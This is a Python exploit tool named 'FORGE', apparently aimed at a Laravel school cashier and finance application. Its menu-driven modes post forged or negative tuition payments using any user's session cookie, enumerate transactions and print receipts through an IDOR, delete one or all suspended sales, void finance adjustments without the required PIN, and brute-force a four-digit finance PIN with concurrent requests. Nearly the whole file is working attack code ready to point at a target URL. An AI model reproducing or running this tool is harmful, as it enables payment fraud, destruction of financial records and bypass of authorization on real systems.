import sys
import json
import asyncio
import aiohttp
import requests
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

BANNER = rf"""
{YELLOW}   ╔═══════════════════════════════════════════════╗
   ║  {BOLD}FORGE{RESET}{YELLOW}  — Cashier & Finance Operations       ║
   ║  CV2-01/02/03 | FV2-02/03 | Payment Forge    ║
   ╚═══════════════════════════════════════════════╝{RESET}
"""

def menu():
    return f"""
  {CYAN}[1]{RESET} Process fake payment (any session)    {DIM}(CV2-01){RESET}
  {CYAN}[2]{RESET} Print any receipt (serverPrint IDOR)  {DIM}(CV2-02){RESET}
  {CYAN}[3]{RESET} Void suspended sale (IDOR)            {DIM}(CV2-03){RESET}
  {CYAN}[4]{RESET} Finance void bypass (no PIN)          {DIM}(FV2-02){RESET}
  {CYAN}[5]{RESET} Finance PIN brute force               {DIM}(FV2-03){RESET}
  {DIM}[0]{RESET} Exit
"""

# ── MODE 1: Process fake payment ──────────────────────────────────────────────
def mode_fake_payment(base_url):
    session    = input(f"  {CYAN}[?]{RESET} laravel_session (any user): ").strip()
    student_id = input(f"  {CYAN}[?]{RESET} Student ID to pay for: ").strip() or "1"
    amount     = input(f"  {CYAN}[?]{RESET} Amount (or negative for credit): ").strip() or "1000"
    
    cookies = {"laravel_session": session}
    payload = {
        "student_id": int(student_id),
        "total_amount": float(amount),
        "amount_tendered": abs(float(amount)),
        "transaction_date": "2026-06-11",
        "receipt_type": "official_receipt",
        "payment_details": [{"type": 1, "amount": float(amount), "reference": None}],
        "selected_items": [{"label": "Tuition", "particulars": "Tuition Fee",
                            "amount": float(amount), "classid": 1, "itemid": None}]
    }
    
    r = requests.post(f"{base_url}/process-payment",
                      json=payload, cookies=cookies, timeout=10)
    try:
        data = r.json()
        if data.get("success"):
            print(f"  {GREEN}[+]{RESET} Payment processed! Transaction ID: {data.get('transaction_id','?')}")
            print(f"  {GREEN}[+]{RESET} Amount: ₱{amount} for student {student_id}")
        else:
            print(f"  {RED}[-]{RESET} Response: {data}")
    except:
        print(f"  {RED}[-]{RESET} HTTP {r.status_code}: {r.text[:200]}")

# ── MODE 2: Print any receipt ─────────────────────────────────────────────────
def mode_print_receipt(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any user): ").strip()
    ornum   = input(f"  {CYAN}[?]{RESET} OR number (e.g. 00123): ").strip()
    studid  = input(f"  {CYAN}[?]{RESET} Student ID: ").strip() or "1"
    
    cookies = {"laravel_session": session}
    
    # First try to enumerate transactions
    if not ornum:
        print(f"  {DIM}[*] Enumerating recent transactions...{RESET}")
        r = requests.get(f"{base_url}/cashier/transactions",
                         params={"search": "", "from": "2026-01-01"},
                         cookies=cookies, timeout=10)
        try:
            data = r.json() if r.headers.get("content-type","").startswith("application/json") else []
            print(f"  {GREEN}[+]{RESET} Found {len(data)} transactions")
            for t in data[:10]:
                print(f"      OR={t.get('ornum','')} | {t.get('fullname','')} | ₱{t.get('total','')}")
        except:
            print(f"  {DIM}[*] Response: {r.text[:200]}{RESET}")
        ornum = input(f"  {CYAN}[?]{RESET} OR number to print: ").strip()
    
    r = requests.get(f"{base_url}/cashier/server-print",
                     params={"ornum": ornum, "studid": studid},
                     cookies=cookies, timeout=10)
    print(f"  {GREEN}[+]{RESET} serverPrint triggered — HTTP {r.status_code}")
    print(f"  {YELLOW}[!]{RESET} Receipt should be printing on the server's physical printer")

# ── MODE 3: Void suspended sale ───────────────────────────────────────────────
def mode_void_suspended(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any user): ").strip()
    cookies = {"laravel_session": session}
    
    # List all suspended sales
    print(f"  {DIM}[*] Listing all suspended sales...{RESET}")
    r = requests.get(f"{base_url}/cashier/suspended-sales", cookies=cookies, timeout=10)
    try:
        data = r.json()
        print(f"  {GREEN}[+]{RESET} Found {len(data)} suspended sales:")
        for s in data[:15]:
            print(f"      ID={s.get('id','')} | {s.get('customer_name','')} | ₱{s.get('total','')}")
    except:
        print(f"  {DIM}[*] Could not parse response{RESET}")
        data = []
    
    target_id = input(f"  {CYAN}[?]{RESET} Sale ID to void (or 'all'): ").strip()
    
    if target_id.lower() == "all":
        for s in data:
            sid = s.get("id")
            r = requests.delete(f"{base_url}/cashier/suspended-sales/{sid}",
                                cookies=cookies, timeout=5)
            print(f"  {GREEN}[+]{RESET} Deleted sale {sid} — HTTP {r.status_code}")
    else:
        r = requests.delete(f"{base_url}/cashier/suspended-sales/{target_id}",
                            cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} Deleted sale {target_id} — HTTP {r.status_code}")

# ── MODE 4: Finance void bypass ───────────────────────────────────────────────
def mode_void_bypass(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session (any finance user): ").strip()
    adj_id  = input(f"  {CYAN}[?]{RESET} Adjustment ID to void: ").strip()
    
    cookies = {"laravel_session": session}
    r = requests.post(f"{base_url}/view-account/adjustment/{adj_id}/void",
                      cookies=cookies, timeout=10)
    try:
        data = r.json()
        if "void" in str(data).lower() or "success" in str(data).lower():
            print(f"  {GREEN}[+]{RESET} Adjustment {adj_id} voided — NO PIN REQUIRED")
        else:
            print(f"  {YELLOW}[?]{RESET} Response: {data}")
    except:
        print(f"  {GREEN}[+]{RESET} HTTP {r.status_code} — {r.text[:100]}")

# ── MODE 5: Finance PIN brute force ──────────────────────────────────────────
async def mode_finance_pin(base_url):
    session  = input(f"  {CYAN}[?]{RESET} laravel_session: ").strip()
    max_conc = int(input(f"  {CYAN}[?]{RESET} Concurrency (default 50): ").strip() or "50")
    
    found_pin = None
    sem = asyncio.Semaphore(max_conc)
    
    async def try_pin(session_http, pin, pbar):
        nonlocal found_pin
        if found_pin:
            return
        async with sem:
            try:
                async with session_http.post(
                    f"{base_url}/view-account/verify-void-pin",
                    json={"pin": pin},
                    cookies={"laravel_session": session},
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as r:
                    data = await r.json()
                    pbar.update(1)
                    if data.get("success") == True:
                        found_pin = pin
                        tqdm.write(f"\n  {GREEN}[+]{RESET} {BOLD}PIN FOUND: {YELLOW}{pin}{RESET}")
            except:
                pbar.update(1)
    
    print(f"  {DIM}[*] Brute-forcing Finance PIN 0000–9999...{RESET}")
    
    async with aiohttp.ClientSession() as session_http:
        with tqdm(total=10000, desc="Bruting", ncols=80) as pbar:
            tasks = []
            for i in range(10000):
                if found_pin:
                    break
                pin = str(i).zfill(4)
                tasks.append(asyncio.create_task(try_pin(session_http, pin, pbar)))
            await asyncio.gather(*tasks, return_exceptions=True)
    
    if not found_pin:
        print(f"  {RED}[-]{RESET} PIN not found (endpoint may differ)")

# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(BANNER)
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
    
    while True:
        print(menu())
        choice = input(f"  {DIM}┌─[forge]─[~]{RESET}\n  {DIM}└──╼ ${RESET} ").strip()
        
        if choice == "0": break
        elif choice == "1": mode_fake_payment(BASE_URL)
        elif choice == "2": mode_print_receipt(BASE_URL)
        elif choice == "3": mode_void_suspended(BASE_URL)
        elif choice == "4": mode_void_bypass(BASE_URL)
        elif choice == "5": asyncio.run(mode_finance_pin(BASE_URL))
        else: print(f"  {RED}[!]{RESET} Invalid choice")
    
    print(f"\n  {DIM}[*] FORGE session ended{RESET}\n")
